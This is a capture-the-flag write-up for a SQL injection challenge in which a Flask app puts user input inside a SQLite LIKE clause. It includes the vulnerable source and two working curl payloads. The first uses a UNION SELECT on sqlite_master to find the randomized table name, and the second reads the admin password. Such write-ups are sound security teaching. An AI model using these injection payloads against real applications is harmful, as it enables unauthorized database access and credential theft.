# SQLi4

## Challenge Description

The users table name is randomized, and the application builds a query with user input inside a `LIKE` clause. The goal is to discover the random table name and then read the admin password (the flag).

## Source Code Analysis

Key lines:

```python
random_user_table = f"users_{random.randrange(2**32, 2**33)}"
db.execute(f"""CREATE TABLE {random_user_table} AS SELECT "admin" AS username, ? as password""", [open("/flag").read()])
db.execute(f"""INSERT INTO {random_user_table} SELECT "guest" as username, "password" as password""")

query = flask.request.args.get("query", "%")
sql = f'SELECT username FROM {random_user_table} WHERE username LIKE "{query}"'
```

User input is interpolated directly into the SQL string, so it is vulnerable to SQL injection. The random table name can be discovered via SQLite metadata tables (`sqlite_master` or `sqlite_schema`).

## Vulnerability

The `query` parameter is inserted into the SQL without parameterization. This allows:

1. Breaking out of the `LIKE "..."` string with `"` 
2. Adding a `UNION SELECT` to return arbitrary data
3. Querying SQLite metadata to discover the randomized table name

## Exploitation

### Step 1: Enumerate the randomized users table

Use `sqlite_master` to list tables that match `users_%`:

```bash
curl -s 'http://challenge.localhost/?query=%22%20UNION%20SELECT%20name%20FROM%20sqlite_master%20WHERE%20type%3D%22table%22%20AND%20name%20LIKE%20%22users_%25%22--%20'
```

This returns the random table name, e.g. `users_6308263873`.

### Step 2: Read the admin password (flag)

Replace the table name in the payload:

```bash
curl -s 'http://challenge.localhost/?query=%22%20UNION%20SELECT%20password%20FROM%20users_6308263873%20WHERE%20username%3D%22admin%22--%20'
```

The `Results` section includes the flag.

## Why This Works

- `"` closes the original `LIKE "..."` string.
- `UNION SELECT` lets us return arbitrary columns.
- `sqlite_master` is a metadata table that stores table names.
- The admin password field is populated with `/flag`.
